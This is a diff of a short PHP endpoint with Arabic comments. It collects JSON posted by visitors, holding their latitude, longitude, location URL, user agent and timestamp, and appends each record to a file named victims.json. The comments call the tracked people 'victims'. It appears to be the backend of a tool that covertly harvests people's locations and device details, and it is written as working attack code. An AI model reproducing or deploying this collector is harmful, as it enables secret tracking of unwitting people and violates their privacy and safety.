@@ -1,20 +1,22 @@
 <?php
+header("Content-Type: application/json");
+
 // استقبال البيانات JSON
 $data = json_decode(file_get_contents("php://input"), true);
 
 if ($data) {
-    $latitude = $data['latitude'];
-    $longitude = $data['longitude'];
-    $locationUrl = $data['locationUrl'];
-    $userAgent = $data['userAgent'];
-    $timestamp = $data['timestamp'];
+    // تحميل البيانات الحالية من victims.json
+    $file = "victims.json";
+    $victims = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
 
-    // تخزينهم في ملف أو قاعدة بيانات (هنا نخزنهم في ملف مؤقت لتجربة)
-    $entry = "وقت: $timestamp\nموقع: $locationUrl\nجهاز: $userAgent\n\n";
-    file_put_contents("victims.txt", $entry, FILE_APPEND);
+    // إضافة الضحية الجديدة
+    $victims[] = $data;
 
-    echo "تم الحفظ";
+    // حفظ التحديث
+    file_put_contents($file, json_encode($victims, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
+
+    echo json_encode(["status" => "success", "message" => "تم الحفظ"]);
 } else {
-    echo "لم تصل بيانات";
+    echo json_encode(["status" => "error", "message" => "لم تصل بيانات"]);
 }
 ?>
